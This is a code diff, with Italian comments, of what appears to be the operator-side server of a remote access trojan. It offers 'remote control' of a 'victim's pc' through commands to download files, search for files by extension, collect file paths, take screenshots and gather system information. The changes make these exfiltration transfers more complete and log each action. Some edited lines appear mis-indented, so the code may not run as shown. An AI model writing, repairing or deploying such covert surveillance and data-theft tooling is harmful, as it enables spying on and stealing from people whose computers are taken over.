@@ -13,7 +13,7 @@ from tqdm import tqdm
 from colorama import Fore
 
 IP = "localhost"
-PORT = 8082  # Porta di 2Ascolto del TCP
+PORT = 8080  # Porta di 2Ascolto del TCP
 ADDR = (IP, PORT)
 SIZE = 4096
 FORMAT = "utf-8"
@@ -54,21 +54,23 @@ def serverConnection():
 
 # OK lista dei comandi disponibili per il controllo remoto
 def commandsHelp():
-    print(f"\n#####                                       Comandi disponibili                                                     ####")
-    print()
-    print(f"Download di file:                           download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
-    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
-    print(f"Mostra Working Directory:                   pwd")
-    print(f"Lista dei file in un percorso:              ls")
-    print(f"Cambia la Working Directory:                cd <path>")
-    print(f"Torna alla cartella precedente:             cd ..")
-    print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
-    print(f"Effettua screenshot:                        screenshot")
-    print(f"Esci dal controllo remoto:                  exit")
-    print(f"Ripulisci terminale:                        clear")
-    print(f"Informazioni so client:                     info")
-    print()
-    print("####################################\n")
+        print(
+            f"\n#####                                       Comandi disponibili                                                     ####")
+        print()
+        print(
+            f"Download di file:                           download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
+        print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
+        print(f"Mostra Working Directory:                   pwd")
+        print(f"Lista dei file in un percorso:              ls")
+        print(f"Cambia la Working Directory:                cd <path>")
+        print(f"Torna alla cartella precedente:             cd ..")
+        print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
+        print(f"Effettua screenshot:                        screenshot")
+        print(f"Esci dal controllo remoto:                  exit")
+        print(f"Ripulisci terminale:                        clear")
+        print(f"Informazioni so client:                     info")
+        print()
+        print("####################################\n")
 
 
 # OK STAMPA INFO CLIENT
@@ -93,6 +95,13 @@ def printInformazioni(clientConnection, addr):
             print("\n"+ buff)
             fileLog=fileLog+"\n"+buff+"\n"
 
+            print(f"[RECEIVING] Informazioni ricevute\n")
+            fileLog = fileLog + "\n" + f"[RECEIVING] Informazioni ricevute\n" + "\n"
+
+            if buff[0:6]=="[PATH]":
+                return buff
+            else:
+                return ""
     except:
         traceback.print_exc()
         print(f"[NOT RECEIVING] Informazioni non ricevute\n")
@@ -102,6 +111,8 @@ def printInformazioni(clientConnection, addr):
 
 # FILESPATH
 def filespath(clientConnection):
+    global fileLog
+
     for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Ricezione informazioni", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
         sleep(0.2)
     print("Attendi...")
@@ -114,30 +125,42 @@ def filespath(clientConnection):
         for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
             sleep(0.2)
 
-        file.write(clientConnection.recv(int(filesize)+800000))
+        file.write(clientConnection.recv(int(filesize) + 8000000))
+
         file.close()
 
         if os.path.getsize(nomeFile) <= 0:
+            fileLog=fileLog+"\n"+ f"File con percorsi dei file creato ma non scritto correttamente!\n"
             print(f"File con percorsi dei file creato ma non scritto correttamente!\n")
         else:
+            fileLog=fileLog+"\n"+ f"File con percorsi dei file creato e scritto correttamente!\n"
             print(f"File con percorsi dei file creato e scritto correttamente!\n")
 
     except:
         traceback.print_exc()
+        fileLog = fileLog + "\n" + "Filespath non riuscito\n"
         print("Filespath non riuscito\n")
 
 
 # CONTROLLO REMOTO
-def remoteControl(clientConnection):
+def remoteControl(clientConnection,buff):
     while True:
         try:
-            pathError = clientConnection.recv(1024).decode(FORMAT)
+            pathError=""
+            if buff[0:6]=="[PATH]":
+                pathError=buff
+                buff=""
+            else:
+                pathError = clientConnection.recv(1024).decode(FORMAT)
 
             if pathError[0:7]=="[ERROR]":
                 path=clientConnection.recv(1024).decode(FORMAT)
                 print(path+"$ "+pathError)
             else:
-                path=pathError
+                while pathError[0:6]!="[PATH]":
+                    pathError=pathError[1:]
+
+                path=pathError[6:]
 
             comando = input(path + "$ ")
             while comando == "":
@@ -153,10 +176,14 @@ def remoteControl(clientConnection):
                 fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Procedura di controllo remoto conclusa con successo!\n" + "\n"
                 break
 
+
             elif comando[0:2] == "ls":
+
                 listdir = pickle.loads(clientConnection.recv(1024))
+
                 for item in listdir:
                     print("-: " + item)
+
                     fileLog = fileLog + "\n" + "-: " + item + "\n"
 
             elif comando[0:8] == "download":
@@ -164,20 +191,29 @@ def remoteControl(clientConnection):
                     file = open(comando[10:len(comando) - 1], 'wb')
                     filesize = clientConnection.recv(1024).decode(FORMAT)
 
-                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
-                        sleep(0.2)
+                    if filesize[0:7]!="[ERROR]":
+                        for i in tqdm(range(20), desc= Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                            sleep(0.2)
 
-                    file.write(clientConnection.recv(int(filesize)))
-                    file.close()
-                    if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
-                        print("Download fallito\n")
+                        scritti=0
+                        while scritti < int(filesize):
+                            scritti=scritti + file.write(clientConnection.recv(int(filesize)+1024))
+
+                        file.close()
+                        if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
+                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
+                            print("Download fallito\n")
+                        else:
+                            fileLog = fileLog + "\n" + f"File scaricato correttamente\n" + "\n"
+                            print(f"File scaricato correttamente\n")
+
+                        time.sleep(2)
                     else:
-                        print(f"File scaricato correttamente\n")
-
-                    time.sleep(2)
+                        raise Exception
                 except:
                     traceback.print_exc()
                     print("Download fallito\n")
+                    fileLog = fileLog + "\n" + "Download fallito\n"
 
             elif comando == "pwd":
                 pwdresult = clientConnection.recv(1024).decode(FORMAT)
@@ -188,16 +224,25 @@ def remoteControl(clientConnection):
             elif comando[0:9] == "filespath":
                 filespath(clientConnection)
 
-            elif comando[0:4] == "find":
+            elif comando[0:4] == "find" and len(comando)>4:
+
                 for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Ricezione informazioni", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
                     sleep(0.2)
-                print("Attendi")
+                print("Attendi...")
+                filesize = clientConnection.recv(1024).decode(FORMAT)
+
+                dato = ('').encode(FORMAT)
                 try:
-                    dato=clientConnection.recv(80000000).decode(FORMAT)
-                    print(dato)
-                    fileLog = fileLog + "\n" + dato + "\n"
+                    dato = dato + clientConnection.recv(int(filesize))
+                    print(dato.decode(FORMAT))
+                    fileLog = fileLog + "\n" + dato.decode(FORMAT) + "\n"
+                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green",
+                                  ncols=50,
+                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
                 except:
                     traceback.print_exc()
+                    fileLog = fileLog + "\n" + "Find non eseguito correttamente\n"
                     print("Find non eseguito correttamente\n")
 
             elif comando == "clear":
@@ -206,16 +251,19 @@ def remoteControl(clientConnection):
             elif comando == "help":
                 commandsHelp()
 
-            elif comando[0:5] == "cd .." or comando[0:2] == "cd":
+            elif comando == "cd .." or comando == "cd":
                 pass
 
-            elif comando[0:4] == "info":
+            elif comando == "info":
                 output = clientConnection.recv(1024).decode(FORMAT)
                 print(output)
                 fileLog = fileLog + "\n" + output + "\n"
 
-            elif comando[0:10] == "screenshot":
-                nomeFoto = input("Inserire nome foto: ")
+            elif comando == "screenshot":
+                nomeFoto = input("Inserire nome foto (.png/.jpeg): ")
+
+                fileLog = fileLog + "\n" + "Inserire nome foto: " + nomeFoto + "\n"
+
                 try:
                     file = open(nomeFoto, 'wb')
                     filesize=clientConnection.recv(1024).decode(FORMAT)
@@ -223,15 +271,27 @@ def remoteControl(clientConnection):
                     for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                         sleep(0.2)
 
-                    file.write(clientConnection.recv(int(filesize)))
+                    scritti = 0
+                    while scritti < int(filesize):
+                        scritti = scritti + file.write(clientConnection.recv(int(filesize)))
+
                     file.close()
+
+                    if os.path.getsize(nomeFoto) <= 0:
+                        fileLog = fileLog + "\n" + "Screenshot fallito\n" + "\n"
+                        print("Screenshot fallito\n")
+                    else:
+                        fileLog = fileLog + "\n" + f"Screenshot scaricato correttamente\n" + "\n"
+                        print(f"Screenshot scaricato correttamente\n")
 
                 except:
                     traceback.print_exc()
                     print("Screenshot fallito\n")
-                    os.remove(nomeFoto)
+                    fileLog = fileLog + "\n" + "Screenshot fallito\n"
+                    #os.remove(nomeFoto)
             else:
                print("[COMANDO ERRATO/NON DISPONIBILE] Command not found... \n")
+               fileLog = fileLog + "\n" + "[COMANDO ERRATO/NON DISPONIBILE] Command not found... \n"
 
         except Exception as e:
             traceback.print_exc()
@@ -259,32 +319,35 @@ def main():
                 os.chdir(os.getcwd() + "/" + f"cartellaClient {addr}")
 
                 global fileLog
-                fileLog = fileLog + "\n" + "[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"
+                fileLog = fileLog + "\n" + f"[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"
 
-                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Loading information on the victim's operating system...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Ricezione informazioni...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                     sleep(0.2)
+
+                buff=""
 
                 # RICEVO INFORMAZIONI SISTEMA OPERATIVO
                 try:
-                    printInformazioni(clientConnection,addr)
+                    buff=printInformazioni(clientConnection,addr)
                 except Exception as e:
                     traceback.print_exc()
                     if e.__class__.__name__ == "ConnectionResetError":
                         print(f"[ERROR] Connessione con client {addr} interrotta!!!\n")
+                        fileLog = fileLog + "\n" + f"[ERROR] Connessione con client {addr} interrotta!!!\n"
                         exit = True
                     else:
+                        fileLog = fileLog + "\n" + f"[ERROR] Qualcosa nella print informazioni non ha funzionato\n"
                         print(f"[ERROR] Qualcosa nella print informazioni non ha funzionato\n")
 
 
                 #ATTIVO LA REMOTE CONTROL
                 attivo = 1
-                print()
                 while attivo == 1:
                     try:
                         for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[REMOTE CONTROL] Starting procedure...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                             sleep(0.2)
                         print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
-                        remoteControl(clientConnection)
+                        remoteControl(clientConnection,buff)
                         attivo = 0
 
                     except Exception as e:
@@ -294,20 +357,21 @@ def main():
                             fileLog = fileLog + "\n" + f"La connessione con il client {addr} si è interrotta\n" + "\n"
                             attivo = 0
                         else:
-                            risposta="null"
-                            clientConnection.recv(300000)
-                            while risposta !='0' and risposta !='1':
-                                risposta = input(f"Remote control non disponibile, riprovare? Y-1/N-0 ")
-                                if risposta == '1':
-                                    attivo = 1
-                                elif risposta == '0':
+                            #risposta="null"
+                            #while risposta !='0' and risposta !='1':
+                                #risposta = input(f"Remote control non disponibile, riprovare? Y-1/N-0 ")
+                                #fileLog = fileLog + "\n" + f"Remote control non disponibile, riprovare? Y-1/N-0 " + risposta +"\n"
+                                #if risposta == '1':
+                                    #attivo = 1
+                                #elif risposta == '0':
                                     attivo = 0
 
                 clientConnection.close()
                 for i in tqdm(range(10), desc=Fore.LIGHTWHITE_EX + "Chiusura connessione client", colour="green", ncols=50,
                               bar_format="{desc}: {percentage:3.0f}% {bar}"):
                     sleep(0.2)
-                print(f"[CLOSED] Client Connection closed succesfully!")
+                print(f"[CLOSED] Client Connection {addr} closed succesfully!")
+                fileLog = fileLog + "\n" + f"[CLOSED] Client Connection {addr} closed succesfully!" + "\n"
                 print()
 
                 # Le operazioni sono concluse e decido come procedere
